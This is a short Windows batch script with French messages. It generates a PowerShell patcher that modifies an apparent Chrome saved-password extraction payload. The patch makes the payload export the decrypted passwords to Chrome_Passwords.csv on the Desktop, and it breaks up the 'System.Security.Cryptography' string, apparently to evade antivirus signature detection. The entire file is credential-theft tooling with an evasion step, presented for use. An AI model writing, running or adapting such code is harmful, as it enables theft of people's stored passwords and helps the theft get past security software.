@echo off
set "WORK_DIR=%TEMP%\chrome_creds_tmp"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
> "%WORK_DIR%\patcher.ps1" echo $ErrorActionPreference = 'Stop'
>> "%WORK_DIR%\patcher.ps1" echo $c = Get-Content "%WORK_DIR%\payload.txt" -Raw
>> "%WORK_DIR%\patcher.ps1" echo $c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
>> "%WORK_DIR%\patcher.ps1" echo $c = $c -replace '\$arrExp ^^^| Format-Table', '$arrExp ^^^| Export-Csv -Path "$env:USERPROFILE\Desktop\Chrome_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Passwords.csv !" -ForegroundColor Green'
>> "%WORK_DIR%\patcher.ps1" echo $c = $c -replace 'System.Security.Cryptography', 'System.Security.Crypto''graphy'
>> "%WORK_DIR%\patcher.ps1" echo Set-Content "%WORK_DIR%\run_chrome.ps1" -Value $c
echo Done
